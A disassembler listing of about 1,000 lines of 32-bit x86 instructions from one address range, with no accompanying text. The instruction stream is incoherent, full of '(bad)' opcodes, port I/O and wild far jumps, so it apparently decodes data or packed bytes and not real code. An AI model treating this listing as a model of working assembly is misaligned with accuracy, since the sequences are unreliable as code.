  42a922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a923:	push   ecx
  42a924:	and    DWORD PTR ds:0xb40ada40,0xae980877
  42a92e:	shl    DWORD PTR [ecx+0x2],0xe6
  42a932:	xor    BYTE PTR [esi-0x62],0x91
  42a936:	mov    ds:0x5cc00ff1,al
  42a93b:	jns    0x42a96f
  42a93d:	mov    WORD PTR [ecx-0x1bd310fd],fs
  42a943:	xor    BYTE PTR [edi+0x3bef70a0],ch
  42a949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a94a:	mov    al,ds:0x90da0b9d
  42a94f:	push   ebp
  42a950:	shr    BYTE PTR [ecx+0x1520257d],cl
  42a956:	xor    edi,ebp
  42a958:	into   
  42a959:	xchg   ebx,eax
  42a95a:	push   eax
  42a95b:	dec    ecx
  42a95c:	out    dx,eax
  42a95d:	or     eax,0x6b95eb9f
  42a962:	out    dx,al
  42a963:	jle    0x42a8f8
  42a965:	pop    ebp
  42a966:	mov    esp,0xe9449114
  42a96b:	loope  0x42a98e
  42a96d:	call   0x32df6ab2
  42a972:	out    0x5b,al
  42a974:	push   ebx
  42a975:	mov    eax,0xcef7768a
  42a97a:	(bad)  
  42a97c:	daa    
  42a97d:	lahf   
  42a97e:	js     0x42a953
  42a980:	outs   dx,DWORD PTR ds:[esi]
  42a981:	mov    ebp,0xbff781e7
  42a986:	neg    DWORD PTR [ebx+ebx*8+0x36]
  42a98a:	sub    DWORD PTR [edx-0xa118257],0x70
  42a991:	mov    ebx,0x22f4092
  42a996:	jge    0x42a923
  42a998:	ret    0xee5e
  42a99b:	pop    ss
  42a99c:	xlat   BYTE PTR ds:[ebx]
  42a99d:	pushf  
  42a99e:	sub    al,0xbc
  42a9a0:	daa    
  42a9a1:	sub    eax,0x18f8b6bc
  42a9a6:	pop    eax
  42a9a7:	scas   al,BYTE PTR es:[edi]
  42a9a8:	adc    BYTE PTR [esi-0x561e3518],bh
  42a9ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a9af:	add    BYTE PTR [esi+0x2fc132db],al
  42a9b5:	aaa    
  42a9b6:	dec    ebx
  42a9b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a9b8:	and    eax,DWORD PTR [edx-0x31]
  42a9bb:	inc    ecx
  42a9bc:	add    al,0x90
  42a9be:	call   0x6ccd:0x4a5369a6
  42a9c5:	imul   BYTE PTR [esi+0x6b264e0f]
  42a9cb:	pop    ds
  42a9cc:	cmp    esi,DWORD PTR [edx-0x13]
  42a9cf:	mov    bh,0x7d
  42a9d1:	iret   
  42a9d2:	jl     0x42a9af
  42a9d4:	jge    0x42aa39
  42a9d6:	dec    esi
  42a9d7:	ror    DWORD PTR [edi+0x4521ac8f],1
  42a9dd:	xchg   DWORD PTR [esp+edi*1],ebx
  42a9e0:	pop    esp
  42a9e1:	dec    esi
  42a9e2:	push   ss
  42a9e3:	scas   eax,DWORD PTR es:[edi]
  42a9e4:	jp     0x42a996
  42a9e6:	add    ah,ch
  42a9e8:	add    eax,0xac036931
  42a9ed:	out    0xf4,al
  42a9ef:	mov    eax,ds:0x300482d5
  42a9f4:	jnp    0x42aa3e
  42a9f6:	xor    eax,DWORD PTR [edx-0x12df9cb5]
  42a9fc:	sub    al,BYTE PTR [ebx]
  42a9fe:	adc    bl,ch
  42aa00:	or     BYTE PTR ds:0x13e6ce72,ch
  42aa06:	push   0xffffffd3
  42aa08:	mov    eax,DWORD PTR [ecx+edx*2-0x60]
  42aa0c:	rol    BYTE PTR [ebx],1
  42aa0e:	dec    esi
  42aa0f:	data16 add BYTE PTR [edi],ah
  42aa12:	jo     0x42aa66
  42aa14:	mov    dh,0x63
  42aa16:	outs   dx,BYTE PTR ds:[esi]
  42aa17:	sbb    al,0x22
  42aa19:	imul   ebp,DWORD PTR [esp+ecx*1-0x13736000],0x5a
  42aa21:	and    ecx,DWORD PTR [ecx*8+0x670021a]
  42aa28:	or     DWORD PTR [ecx],esp
  42aa2a:	shl    DWORD PTR [esi],0xeb
  42aa2d:	pop    edx
  42aa2e:	in     eax,0x1f
  42aa30:	cmp    DWORD PTR [eax-0x27],eax
  42aa33:	(bad)  
  42aa34:	sbb    BYTE PTR [esp+ebp*2-0x42],ch
  42aa38:	into   
  42aa39:	jnp    0x42a9f3
  42aa3b:	lods   al,BYTE PTR ds:[esi]
  42aa3c:	gs mov ebx,0xdd808cdc
  42aa42:	adc    eax,0xd055cde4
  42aa47:	jl     0x42aa4d
  42aa49:	daa    
  42aa4a:	xchg   ebp,eax
  42aa4b:	ss inc esi
  42aa4d:	gs jmp 0x42aa8c
  42aa50:	add    al,0x3a
  42aa52:	retf   
  42aa53:	or     edx,DWORD PTR [ecx+eax*4+0x745a969d]
  42aa5a:	(bad)  
  42aa5b:	pop    ss
  42aa5c:	rcr    BYTE PTR [edx+0x72],0xeb
  42aa60:	mov    DWORD PTR [eax+eiz*4-0x58],esi
  42aa64:	sub    DWORD PTR [ebx],ebp
  42aa66:	jbe    0x42aacd
  42aa68:	inc    eax
  42aa69:	mov    BYTE PTR ds:0x7e5f4f5,dl
  42aa6f:	sub    cl,BYTE PTR [ebp-0x24]
  42aa72:	mov    ebx,0x11849df9
  42aa77:	push   eax
  42aa78:	jb     0x42aa73
  42aa7a:	inc    esp
  42aa7b:	stos   BYTE PTR es:[edi],al
  42aa7c:	add    al,0x4
  42aa7e:	sub    bh,ah
  42aa80:	sub    DWORD PTR [ebx-0x6f13c065],ebp
  42aa86:	sub    DWORD PTR [eax+0x3],edi
  42aa89:	add    BYTE PTR [edi+ebp*1-0x13],cl
  42aa8d:	add    bl,BYTE PTR [esi-0x43a12726]
  42aa93:	jecxz  0x42aac8
  42aa95:	out    dx,eax
  42aa96:	stc    
  42aa97:	popf   
  42aa98:	mov    bh,0xdd
  42aa9a:	jg     0x42aa87
  42aa9c:	cmp    ecx,DWORD PTR [edi-0x31]
  42aa9f:	mov    bh,0x77
  42aaa1:	(bad)  
  42aaa2:	into   
  42aaa3:	jmp    0x99c0c348
  42aaa8:	rol    eax,1
  42aaaa:	xchg   edx,eax
  42aaab:	(bad)  
  42aaac:	mov    esi,DWORD PTR [ecx]
  42aaae:	(bad)  
  42aaaf:	push   eax
  42aab0:	adc    DWORD PTR [ebx+ebx*2],ebp
  42aab3:	jae    0x42aa40
  42aab5:	iret   
  42aab6:	rol    edx,1
  42aab8:	jecxz  0x42ab1f
  42aaba:	mov    esp,0xfc04cb00
  42aabf:	rcl    DWORD PTR [esp+eax*2+0x10b97db7],1
  42aac6:	push   0xc0d436f9
  42aacb:	mov    ebx,DWORD PTR [ebp+0x58]
  42aace:	adc    DWORD PTR [ebp+0x70016832],edi
  42aad4:	dec    edx
  42aad5:	leave  
  42aad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aad7:	xchg   esp,eax
  42aad8:	test   al,0x6d
  42aada:	pop    ebx
  42aadb:	int3   
  42aadc:	outs   dx,WORD PTR ds:[esi]
  42aade:	jge    0x42aacb
  42aae0:	jmp    0xec7e:0xb27fb5da
  42aae7:	pop    ebx
  42aae8:	mov    esi,0xdfd9767b
  42aaed:	sub    al,0x12
  42aaef:	jns    0x42ab63
  42aaf1:	fs sbb eax,0xb3b9923e
  42aaf7:	add    dl,BYTE PTR [edi]
  42aaf9:	adc    al,0x23
  42aafb:	sub    BYTE PTR [ecx+0x69],bh
  42aafe:	rcl    DWORD PTR [esi+edi*4+0xb72ffa6],1
  42ab05:	out    dx,eax
  42ab06:	add    edi,DWORD PTR [eax+0x6404c60d]
  42ab0c:	fdivr  QWORD PTR [ebp-0x6a]
  42ab0f:	scas   eax,DWORD PTR es:[edi]
  42ab10:	inc    esi
  42ab11:	adc    cl,BYTE PTR [eax-0x4576a2d1]
  42ab17:	nop
  42ab18:	mov    DWORD PTR [esp+edx*4],eax
  42ab1b:	and    esp,DWORD PTR [ecx+eax*1+0xb652072]
  42ab22:	adc    dh,0xb4
  42ab25:	jnp    0x42aad5
  42ab27:	and    BYTE PTR [ebp-0x3a97024e],ch
  42ab2d:	pop    ebx
  42ab2e:	rcr    cl,cl
  42ab30:	sbb    DWORD PTR [edx*4+0x42040424],0x4c9585ee
  42ab3b:	cmp    BYTE PTR [edx],dl
  42ab3d:	xchg   esp,eax
  42ab3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ab3f:	fcmovnb st,st(0)
  42ab41:	xor    al,0xc7
  42ab43:	xor    eax,0x9381335c
  42ab48:	sbb    bl,ah
  42ab4a:	mov    es,WORD PTR [ecx+0x7b]
  42ab4d:	arpl   sp,sp
  42ab4f:	int    0x11
  42ab51:	push   0x1f3c1573
  42ab56:	add    edx,eax
  42ab58:	dec    eax
  42ab59:	dec    ecx
  42ab5a:	nop
  42ab5b:	or     al,0x44
  42ab5d:	arpl   WORD PTR [eax+0x57],dx
  42ab60:	push   edx
  42ab61:	lods   al,BYTE PTR ds:[esi]
  42ab62:	sahf   
  42ab63:	or     eax,0x9b2ec8eb
  42ab68:	fcom   st(3)
  42ab6a:	adc    DWORD PTR [edx+0x70],edi
  42ab6d:	imul   ebp,DWORD PTR [ecx],0x773dc82e
  42ab73:	sub    BYTE PTR [ecx-0x57],0x6b
  42ab77:	inc    eax
  42ab78:	adc    eax,edi
  42ab7a:	mov    ds:0x4a10ba98,al
  42ab7f:	inc    ecx
  42ab80:	xor    ah,BYTE PTR ds:[ecx+0x27]
  42ab84:	rcl    DWORD PTR [esi-0x19],1
  42ab87:	or     al,0x1d
  42ab89:	call   DWORD PTR [esi-0x207d09d8]
  42ab8f:	std    
  42ab90:	mov    esi,0x98200352
  42ab95:	pop    esi
  42ab96:	fiadd  WORD PTR ds:0xbd824e39
  42ab9c:	iret   
  42ab9d:	ds hlt 
  42ab9f:	(bad)  
  42aba0:	aas    
  42aba1:	clc    
  42aba2:	mov    ebp,0xadf0fffb
  42aba7:	imul   DWORD PTR [esi-0x61]
  42abaa:	fstp   QWORD PTR [eax-0x5e0223f1]
  42abb0:	jne    0x42abd0
  42abb2:	scas   al,BYTE PTR es:[edi]
  42abb3:	mov    ebp,DWORD PTR [ebx]
  42abb5:	(bad)
  42abb8:	sbb    al,0x5e
  42abba:	pop    edi
  42abbb:	adc    al,0xd0
  42abbd:	adc    DWORD PTR [ebx+eax*8],0xffffffe2
  42abc1:	pop    edx
  42abc2:	cmp    al,0xe8
  42abc4:	icebp  
  42abc5:	mov    dl,0x4e
  42abc7:	shr    BYTE PTR [ebx],0x29
  42abca:	test   DWORD PTR [edi],ebp
  42abcc:	push   0x3b4ca7b
  42abd1:	add    edi,ebx
  42abd3:	retf   0x1781
  42abd6:	fwait
  42abd7:	xor    al,0x4a
  42abd9:	add    DWORD PTR [ebp+0x18],0xffffffdc
  42abdd:	sub    al,BYTE PTR [eax]
  42abdf:	mov    ch,0xdd
  42abe1:	(bad)  
  42abe2:	in     al,dx
  42abe3:	jno    0x42ac22
  42abe5:	js     0x42ac43
  42abe7:	add    DWORD PTR [eax],ebx
  42abe9:	test   DWORD PTR [eax],edx
  42abeb:	inc    esi
  42abec:	push   ebp
  42abed:	push   ebp
  42abee:	aad    0x6b
  42abf0:	xchg   DWORD PTR [esi-0x2f1a838f],ebx
  42abf6:	retf   
  42abf7:	mov    esi,0x16793c0b
  42abfc:	and    al,0xd3
  42abfe:	in     al,0xaa
  42ac00:	cmc    
  42ac01:	cs pop ebp
  42ac03:	in     eax,0x43
  42ac05:	or     BYTE PTR [edi],0x36
  42ac08:	push   esi
  42ac09:	retf   0x796b
  42ac0c:	xor    DWORD PTR [ecx],edi
  42ac0e:	inc    ecx
  42ac0f:	sbb    BYTE PTR [ecx-0x54],bh
  42ac12:	lods   al,BYTE PTR ds:[esi]
  42ac13:	mov    WORD PTR [eax-0x113a20c5],?
  42ac19:	xchg   ecx,eax
  42ac1a:	cmp    esi,DWORD PTR [ecx+0x6e45ef9d]
  42ac20:	retf   0x4f10
  42ac23:	jmp    0x80c2:0x19897e18
  42ac2a:	test   DWORD PTR [esp+ebp*8+0x1367dd44],0x625fd2c
  42ac35:	(bad)  
  42ac36:	mov    cl,0xce
  42ac38:	sub    eax,0x854b8054
  42ac3d:	xor    esp,DWORD PTR [ebx]
  42ac3f:	fld    st(0)
  42ac41:	rdmsr  
  42ac43:	mov    dl,0xcf
  42ac45:	shl    DWORD PTR [eax+0x3756760c],0xef
  42ac4c:	loopne 0x42acaa
  42ac4e:	or     BYTE PTR [ebx],0x1
  42ac51:	rcl    DWORD PTR [ebp-0x10],0x6e
  42ac55:	or     al,0x97
  42ac57:	push   esi
  42ac58:	rcr    DWORD PTR [ebx+0x2b1c147],0xcd
  42ac5f:	imul   esp,DWORD PTR [eax+0x56],0xffffff83
  42ac63:	and    dx,WORD PTR [eax+0x364340d4]
  42ac6a:	mov    al,ds:0x8910ac53
  42ac6f:	jnp    0x42ac52
  42ac71:	xchg   esi,eax
  42ac73:	out    dx,al
  42ac74:	inc    edx
  42ac75:	retf   0x4083
  42ac78:	(bad)  
  42ac79:	adc    eax,ebx
  42ac7b:	xchg   ebp,eax
  42ac7c:	not    DWORD PTR [esi-0xfb14316]
  42ac82:	popa   
  42ac83:	or     eax,0x9c0ca63e
  42ac88:	out    dx,al
  42ac89:	push   edi
  42ac8a:	jp     0x42ac80
  42ac8c:	mov    esp,DWORD PTR [edi-0x60]
  42ac8f:	ror    DWORD PTR [edx-0x60daf27a],1
  42ac95:	das    
  42ac96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ac97:	and    eax,0x7fd609bb
  42ac9c:	add    ecx,ebp
  42ac9e:	sub    eax,DWORD PTR [edi]
  42aca0:	or     eax,eax
  42aca2:	ja     0x42ad1d
  42aca4:	pinsrw mm5,WORD PTR [edx+eax*4],0xd9
  42aca9:	inc    ebx
  42acaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42acab:	aas    
  42acac:	repnz out dx,al
  42acae:	ja     0x42ad2e
  42acb0:	cli    
  42acb1:	(bad)  
  42acb2:	fistp  QWORD PTR [ebp-0x781e0c95]
  42acb8:	test   BYTE PTR [esi],0x82
  42acbb:	aas    
  42acbc:	je     0x42ac75
  42acbe:	shl    eax,cl
  42acc0:	jmp    DWORD PTR [ecx+0x17ec2570]
  42acc6:	mov    ah,0x65
  42acc8:	out    dx,al
  42acc9:	not    DWORD PTR [eax+0x28]
  42accc:	mov    cl,0x70
  42acce:	mov    edi,0x1d2b9ef8
  42acd3:	sti    
  42acd4:	mov    al,ds:0xddf2ffbe
  42acd9:	xchg   esi,eax
  42acda:	cmp    eax,0x20a5347e
  42acdf:	lahf   
  42ace0:	outs   dx,DWORD PTR ds:[esi]
  42ace1:	aaa    
  42ace2:	loopne 0x42ad37
  42ace4:	aad    0x3
  42ace6:	pop    eax
  42ace7:	push   ss
  42ace8:	dec    ebx
  42ace9:	xchg   ebp,eax
  42acea:	pushf  
  42aceb:	outs   dx,BYTE PTR ds:[esi]
  42acec:	jmp    0x162b37a1
  42acf1:	lds    eax,FWORD PTR [ecx+0x1d]
  42acf4:	push   edi
  42acf5:	aam    0xb6
  42acf7:	lods   eax,DWORD PTR ds:[esi]
  42acf8:	mov    ah,0x6d
  42acfa:	fwait
  42acfb:	call   0xf9b:0xdb53dee6
  42ad02:	mov    esp,0x33d0ed6e
  42ad07:	dec    edi
  42ad08:	lods   al,BYTE PTR ds:[esi]
  42ad09:	push   ds
  42ad0a:	stc    
  42ad0b:	cli    
  42ad0c:	push   edi
  42ad0d:	dec    esi
  42ad0e:	das    
  42ad0f:	lock mov bl,0x5
  42ad12:	cdq    
  42ad13:	push   esi
  42ad14:	(bad)  
  42ad15:	lods   eax,DWORD PTR ds:[esi]
  42ad16:	and    eax,DWORD PTR [ebx]
  42ad18:	push   0xe5782313
  42ad1d:	(bad)  [edi]
  42ad1f:	adc    eax,0x8e6009c0
  42ad24:	dec    eax
  42ad25:	jecxz  0x42ad2b
  42ad27:	dec    edx
  42ad28:	push   cs
  42ad29:	mov    esp,0x934047b
  42ad2e:	adc    BYTE PTR [ebx-0x1f],ch
  42ad31:	sub    eax,0x37dd3dc5
  42ad36:	and    edx,ecx
  42ad38:	xchg   ebp,eax
  42ad39:	sbb    DWORD PTR [ecx],ecx
  42ad3b:	fld    DWORD PTR [ecx+0x9]
  42ad3e:	inc    esp
  42ad3f:	retf   0x1f04
  42ad42:	mov    dh,0xc1
  42ad44:	mov    eax,ds:0xec5188cc
  42ad49:	sbb    ebp,DWORD PTR [ebx+0x75]
  42ad4c:	and    cl,BYTE PTR [eax+0x5b]
  42ad4f:	fwait
  42ad50:	mov    ch,0x69
  42ad52:	shr    DWORD PTR [edx],1
  42ad54:	sbb    ch,al
  42ad56:	call   0xf436ba17
  42ad5b:	in     al,dx
  42ad5c:	loopne 0x42adda
  42ad5e:	inc    eax
  42ad5f:	mov    al,ds:0x835e5c11
  42ad64:	fistp  QWORD PTR [esi]
  42ad66:	push   es
  42ad67:	sahf   
  42ad68:	lods   eax,DWORD PTR ds:[esi]
  42ad69:	xor    dh,0x26
  42ad6c:	lock imul ecx,DWORD PTR [edx+eax*4],0x40f6703
  42ad74:	setns  BYTE PTR [ebx]
  42ad77:	pop    edx
  42ad78:	popf   
  42ad79:	sub    BYTE PTR [esi+0x24],0xc3
  42ad7d:	outs   dx,BYTE PTR fs:[esi]
  42ad7f:	jnp    0x42ad92
  42ad81:	push   0xffffffeb
  42ad83:	(bad)  
  42ad84:	fcmovnbe st,st(7)
  42ad86:	xchg   edx,eax
  42ad87:	or     edi,ebp
  42ad89:	dec    ebp
  42ad8a:	push   cs
  42ad8b:	sub    BYTE PTR [ebx+0x68fb61cf],ah
  42ad91:	sub    DWORD PTR [ebx+0x3d4c2ffe],esi
  42ad97:	ffree  st(0)
  42ad99:	ret    0x1205
  42ad9c:	inc    eax
  42ad9d:	xor    esp,DWORD PTR [ecx]
  42ad9f:	add    al,0x88
  42ada1:	fs (bad) 
  42ada3:	out    dx,al
  42ada4:	jns    0x42adab
  42ada6:	test   DWORD PTR [esi+0x4a735dc3],0x839e5f98
  42adb0:	mov    BYTE PTR [edx-0x2c362138],dh
  42adb6:	pop    ds
  42adb7:	stc    
  42adb8:	out    dx,eax
  42adb9:	out    dx,eax
  42adba:	dec    ah
  42adbc:	pop    ds
  42adbd:	mov    edi,0xf4bcee5
  42adc2:	cmp    eax,0xdeb4b538
  42adc7:	out    0x22,eax
  42adc9:	or     al,0x8b
  42adcb:	xchg   esi,eax
  42adcc:	std    
  42adcd:	and    bh,dl
  42adcf:	sbb    eax,0x5be2de58
  42add4:	push   ds
  42add5:	arpl   WORD PTR [ecx-0x61],sp
  42add8:	inc    ebp
  42add9:	inc    ebp
  42adda:	xor    dh,BYTE PTR [ebp+edi*8-0x69]
  42adde:	xor    DWORD PTR [esi],eax
  42ade0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ade1:	test   edi,edi
  42ade3:	scas   eax,DWORD PTR es:[edi]
  42ade4:	and    al,0xec
  42ade6:	retf   
  42ade7:	inc    edx
  42ade8:	sub    DWORD PTR [edi],0xaa7813c8
  42adee:	sub    al,BYTE PTR [eax]
  42adf0:	pusha  
  42adf1:	mov    ecx,0x2f6255db
  42adf6:	ret    0x8172
  42adf9:	pop    ds
  42adfa:	out    dx,al
  42adfb:	mov    edi,0x6db7ab4f
  42ae00:	(bad)  [esi-0x58060cb3]
  42ae07:	push   ds
  42ae08:	fidivr DWORD PTR [edx+0x6b2dff7c]
  42ae0e:	jmp    0x42ade7
  42ae10:	pop    edi
  42ae11:	mov    ch,0x7a
  42ae13:	clc    
  42ae14:	gs jg  0x42ae82
  42ae17:	test   DWORD PTR [edx-0x23b7d185],0x3904d0e8
  42ae21:	and    al,0xb0
  42ae23:	js     0xca986f5a
  42ae29:	adc    eax,esp
  42ae2b:	(bad)  
  42ae2c:	fnsave ss:[esi-0x5]
  42ae30:	or     BYTE PTR [ebp+edi*2+0xc],bh
  42ae34:	sub    eax,0x7d52841e
  42ae39:	ret    
  42ae3a:	test   ah,al
  42ae3c:	sar    DWORD PTR [eax-0x7d],0xb5
  42ae40:	mov    bl,0xcf
  42ae42:	mov    cl,0x26
  42ae44:	add    BYTE PTR [edx+0x6],dl
  42ae47:	adc    esp,DWORD PTR [ecx]
  42ae49:	adc    esp,DWORD PTR [ecx]
  42ae4b:	jae    0x42add3
  42ae4d:	arpl   WORD PTR [eax],ax
  42ae4f:	pushf  
  42ae50:	cmp    al,cl
  42ae52:	arpl   WORD PTR [esi+0xc27ad2e],dx
  42ae58:	in     eax,dx
  42ae59:	cmc    
  42ae5a:	aaa    
  42ae5b:	call   0xace1:0xe06d666f
  42ae62:	and    eax,0x8464ebd
  42ae67:	push   edx
  42ae68:	mov    ds:0xd3f06b8a,eax
  42ae6d:	and    esp,eax
  42ae6f:	fnsave [ebp-0x10]
  42ae72:	ins    BYTE PTR es:[edi],dx
  42ae73:	or     eax,0x3a70d62e
  42ae78:	inc    edi
  42ae79:	fadd   QWORD PTR [esi-0x5f]
  42ae7c:	pop    ecx
  42ae7d:	scas   eax,DWORD PTR es:[edi]
  42ae7e:	nop
  42ae7f:	xchg   ebp,eax
  42ae80:	int3   
  42ae81:	jp     0x42aeda
  42ae83:	bound  ebp,QWORD PTR [edi+0x13]
  42ae86:	loopne 0x42ae96
  42ae88:	xchg   ebp,eax
  42ae89:	das    
  42ae8a:	mov    ds:0x3179ec39,eax
  42ae8f:	test   DWORD PTR [eax],eax
  42ae91:	xchg   BYTE PTR [eax+0x129776bb],al
  42ae97:	xchg   BYTE PTR [eax],cl
  42ae99:	mov    DWORD PTR [ecx],ebx
  42ae9b:	ins    BYTE PTR es:[edi],dx
  42ae9c:	xor    DWORD PTR [esi-0x77ab7e1e],edx
  42aea2:	sub    BYTE PTR [ebx],dh
  42aea4:	xchg   ebx,eax
  42aea5:	or     DWORD PTR [edx+0xf3139cd],edi
  42aeab:	cmp    BYTE PTR [edx],0xcf
  42aeae:	inc    edx
  42aeaf:	and    BYTE PTR [eax-0x53aa27a2],bl
  42aeb5:	shl    DWORD PTR [ecx+0x4a],0xd3
  42aeb9:	int    0xcf
  42aebb:	sahf   
  42aebc:	mov    edx,0xe8ff0ffd
  42aec1:	xor    edi,0x9ddef3bf
  42aec7:	xor    esp,DWORD PTR [edi+0x2edb6da7]
  42aecd:	jbe    0x42aeb6
  42aecf:	sub    eax,0xff17e58b
  42aed4:	pop    edi
  42aed5:	push   es
  42aed6:	call   0x3c38b2c0
  42aedb:	dec    eax
  42aedc:	test   al,0x97
  42aede:	or     esi,esp
  42aee0:	xor    cl,BYTE PTR [edi+0x43f02860]
  42aee6:	stos   DWORD PTR es:[edi],eax
  42aee7:	aas    
  42aee8:	adc    al,0xf6
  42aeea:	sub    edx,DWORD PTR [ecx+0xa141c83]
  42aef0:	jl     0x42af33
  42aef2:	fist   DWORD PTR [ebx+0x2a]
  42aef5:	add    al,0x0
  42aef7:	push   ds
  42aef8:	rcl    DWORD PTR ds:0x86030c38,1
  42aefe:	mov    eax,ds:0x4adc1f80
  42af03:	cmp    BYTE PTR [eax],dh
  42af05:	mov    esp,0xebee4bd5
  42af0a:	loope  0x42aeca
  42af0c:	fdivp  st(3),st
  42af0e:	fidivr DWORD PTR [ebx+0x5f]
  42af11:	lea    esp,[edi]
  42af13:	xchg   DWORD PTR [edi+0xf],edx
  42af16:	pop    edi
  42af17:	cmc    
  42af18:	dec    ebp
  42af19:	das    
  42af1a:	repz cmc 
  42af1c:	jne    0x42af4d
  42af1e:	adc    ah,BYTE PTR [eax-0x3c]
  42af21:	add    al,0x4c
  42af23:	scas   al,BYTE PTR es:[edi]
  42af24:	pop    edx
  42af25:	aaa    
  42af26:	es pop ebp
  42af28:	shr    DWORD PTR [eax-0x2b],0x63
  42af2c:	mov    dl,0xb6
  42af2e:	cmp    cl,0x6c
  42af31:	mov    ds,ecx
  42af33:	clc    
  42af34:	and    al,0xb6
  42af36:	daa    
  42af37:	mov    bh,0x23
  42af39:	xor    eax,0x1c10807b
  42af3e:	mov    ecx,0xfa170d9e
  42af43:	pop    eax
  42af44:	add    DWORD PTR [ecx],esi
  42af46:	imul   ecx,ecx,0xffffffed
  42af49:	cld    
  42af4a:	adc    esi,DWORD PTR [ebp-0x4b]
  42af4d:	cdq    
  42af4e:	mov    ch,0xa
  42af50:	mov    es,WORD PTR [ecx+0x5d]
  42af53:	cmp    al,0xad
  42af55:	adc    eax,DWORD PTR [ebp+0x74e8e52d]
  42af5b:	add    BYTE PTR [edi+0x2bec0e0b],ah
  42af61:	js     0x42afba
  42af63:	sbb    DWORD PTR [ebp+0x40],0xffffffa0
  42af67:	or     DWORD PTR [edx+0x5c],eax
  42af6a:	xchg   DWORD PTR [ebx+0x57],ebp
  42af6d:	loope  0x42af65
  42af6f:	push   esi
  42af70:	shl    ebx,0x55
  42af73:	clc    
  42af74:	cmp    al,0x6
  42af76:	ret    
  42af77:	and    DWORD PTR [edi-0x38bbb6e7],esi
  42af7d:	push   es
  42af7e:	add    BYTE PTR [eax],al
  42af80:	mov    ah,0x45
  42af82:	xchg   esi,eax
  42af83:	int    0x15
  42af85:	out    dx,eax
  42af86:	or     DWORD PTR [ebx],edi
  42af88:	lods   al,BYTE PTR ds:[esi]
  42af89:	adc    al,0xd7
  42af8b:	jno    0x42af14
  42af8d:	and    eax,0x4aeebca0
  42af92:	aaa    
  42af93:	pop    ds
  42af94:	jne    0x42af34
  42af96:	adc    BYTE PTR [esp+edi*8],0x61
  42af9a:	pop    eax
  42af9b:	mov    dh,0x6b
  42af9d:	inc    edx
  42af9e:	scas   al,BYTE PTR es:[edi]
  42af9f:	aas    
  42afa0:	cwde   
  42afa1:	dec    ebp
  42afa2:	sbb    al,ah
  42afa4:	sbb    dl,BYTE PTR [edx*2+0x778a09d9]
  42afab:	rcr    DWORD PTR ds:0xecd68819,0x33
  42afb2:	enter  0xbb73,0x77
  42afb6:	out    0xb3,al
  42afb8:	lahf   
  42afb9:	js     0x42afb3
  42afbb:	and    edi,DWORD PTR [edi-0x10]
  42afbe:	ficom  WORD PTR [ebx-0x562081e1]
  42afc4:	jmp    0xe77f96af
  42afc9:	mov    esp,0x3c47e6e8
  42afce:	rcr    BYTE PTR [ebp+0x1f],cl
  42afd1:	or     ah,BYTE PTR [ecx+0x1c]
  42afd4:	cmp    al,0xf
  42afd6:	sub    al,0xb7
  42afd8:	retf   0x84cb
  42afdb:	ja     0x42b04e
  42afdd:	fild   WORD PTR [edi+0xb]
  42afe0:	xsave  [ebp+edx*8+0x17]
  42afe5:	mov    cl,0xa8
  42afe7:	gs or  ah,al
  42afea:	and    BYTE PTR [esi-0x5f],dh
  42afed:	inc    edi
  42afee:	pop    eax
  42afef:	jmp    FWORD PTR [edi]
  42aff1:	xor    eax,DWORD PTR [edx]
  42aff3:	sbb    eax,0xead32dbc
  42aff8:	lds    ecx,FWORD PTR [ebx]
  42affa:	shl    al,0xb9
  42affd:	loope  0x42affd
  42afff:	ret    
  42b000:	imul   DWORD PTR [esi+ebp*1]
  42b003:	test   BYTE PTR [eax-0x11],ch
  42b006:	dec    ebp
  42b007:	xor    esi,eax
  42b009:	sbb    al,0x63
  42b00b:	mov    WORD PTR [ecx],?
  42b00d:	sahf   
  42b00e:	dec    edi
  42b00f:	sar    DWORD PTR [ebp+0x421adfb7],cl
  42b015:	clc    
  42b016:	xchg   ebx,eax
  42b017:	and    edx,edi
  42b019:	jl     0x42aff8
  42b01b:	rep stos BYTE PTR es:[edi],al
  42b01d:	rcl    DWORD PTR [edi-0x3],1
  42b020:	(bad)  
  42b021:	(bad)  
  42b023:	fcmovnb st,st(7)
  42b025:	adc    al,0x13
  42b027:	arpl   sp,sp
  42b029:	imul   edx,esi,0xffffffe1
  42b02c:	test   al,0x81
  42b02e:	or     BYTE PTR [ecx-0x2cdf5163],ah
  42b034:	add    al,0x6d
  42b036:	fiadd  WORD PTR [edx+esi*4]
  42b039:	and    BYTE PTR [ebx+0x61d3edce],dh
  42b03f:	mov    eax,ds:0xe1834a3a
  42b044:	nop
  42b045:	xchg   ecx,eax
  42b046:	ror    DWORD PTR [esi-0x5dbd5380],0xcd
  42b04d:	dec    eax
  42b04e:	mov    ecx,0x63214813
  42b053:	(bad)  
  42b054:	jno    0x42b060
  42b056:	lock jno 0x42b061
  42b059:	or     BYTE PTR [esp+edx*1+0x41],bh
  42b05d:	(bad)  
  42b05e:	loopne 0x42b0b2
  42b060:	add    BYTE PTR ds:0x90eb1c15,dh
  42b066:	dec    esi
  42b067:	(bad)  
  42b068:	arpl   WORD PTR [ebp+0x3b],bp
  42b06b:	dec    esi
  42b06c:	and    esi,DWORD PTR [eax-0x52]
  42b06f:	shr    DWORD PTR [ecx+0x2],0x17
  42b073:	imul   eax,DWORD PTR [eax+0x24dd2758],0xfffffff4
  42b07a:	and    al,0x27
  42b07c:	push   edx
  42b07d:	loop   0x42b071
  42b07f:	pop    esi
  42b080:	clc    
  42b081:	idiv   DWORD PTR [ecx]
  42b083:	dec    ecx
  42b084:	(bad)  
  42b085:	(bad)  
  42b086:	ficom  WORD PTR [edx-0x7f]
  42b089:	pop    ebp
  42b08a:	pop    esi
  42b08b:	mov    esi,0xd85300c
  42b090:	and    dl,BYTE PTR [ecx-0x69]
  42b093:	shl    BYTE PTR [edx],0x1c
  42b096:	call   0x2bf6:0x23758396
  42b09d:	pop    edx
  42b09e:	addr16 ss ja 0x42b08e
  42b0a2:	mov    esp,0x8a603b25
  42b0a7:	fs idiv esp
  42b0aa:	jbe    0x42b095
  42b0ac:	push   ecx
  42b0ad:	adc    BYTE PTR [eax-0x26],dl
